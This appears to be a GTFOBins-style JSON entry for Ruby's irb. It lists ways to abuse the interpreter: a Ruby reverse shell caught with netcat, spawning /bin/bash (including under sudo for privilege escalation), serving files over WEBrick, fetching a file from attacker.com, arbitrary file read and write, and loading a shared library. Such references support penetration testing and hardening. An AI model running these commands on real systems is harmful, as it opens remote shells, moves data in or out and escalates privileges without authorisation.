{
  "functions": {
    "shell": [
      {
        "code": "irb\nexec '/bin/bash'\n"
      }
    ],
    "reverse-shell": [
      {
        "description": "Run `nc -l -p 12345` on the attacker box to receive the shell.",
        "code": "export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end\n"
      }
    ],
    "file-upload": [
      {
        "description": "Serve files in the local folder running an HTTP server on port 8888.",
        "code": "irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;\n"
      }
    ],
    "file-download": [
      {
        "description": "Fetch a remote file via HTTP GET request.",
        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])\n"
      }
    ],
    "file-write": [
      {
        "code": "irb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }\n"
      }
    ],
    "file-read": [
      {
        "code": "irb\nputs File.read(\"file_to_read\")\n"
      }
    ],
    "library-load": [
      {
        "code": "irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")\n"
      }
    ],
    "sudo": [
      {
        "code": "sudo irb\nexec '/bin/bash'\n"
      }
    ]
  }
}
